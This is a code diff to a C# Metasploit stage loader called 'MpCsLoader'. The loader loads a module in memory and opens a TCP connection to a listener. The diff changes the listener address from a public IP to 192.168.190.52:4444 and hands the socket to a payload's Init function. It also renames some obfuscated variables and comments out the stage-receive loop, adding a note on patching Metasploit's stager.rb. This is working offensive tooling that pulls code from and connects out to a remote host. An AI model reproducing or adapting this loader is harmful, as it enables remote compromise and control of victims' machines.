@@ -40,7 +40,7 @@ namespace MpCsLoader
                 {
                     IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
                     MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
-                    int sockfd = StageLoader.LoadBinData("107.170.234.111", 1433);
+                    int sockfd = StageLoader.LoadBinData("192.168.190.52", 4444);
                     func(sockfd);
                 }
             }//hehe
@@ -66,14 +66,20 @@ namespace MpCsLoader
                 Socket svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 try { svrSocket.Connect(serverEP); }
                 catch { return 0; }
-                byte[] BTexRtLHjsryJ = new byte[4];
-                svrSocket.Receive(BTexRtLHjsryJ, 4, 0);
-                int RUgJAb = BitConverter.ToInt32(BTexRtLHjsryJ, 0);
+                byte[] lenBuf = new byte[4];
+                svrSocket.Receive(lenBuf, 4, 0);
+                int RUgJAb = BitConverter.ToInt32(lenBuf, 0);
                 byte[] binBuffer = new byte[RUgJAb + 5];
                 int PmUVgiyFcZ = 0;
-                while (PmUVgiyFcZ < RUgJAb)
-                { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
+                /*
+                 * modify /opt/metasploit/apps/pro/msf3/lib/msf/core/payload/stager.rb
+                 *    # Send the stage
+                      #conn.put(p)      <----- no need for payload
 
+                 * 
+                                while (PmUVgiyFcZ < RUgJAb)
+                                { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
+                                */
                 //File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
                 
                 byte[] socketID = BitConverter.GetBytes((int)svrSocket.Handle);
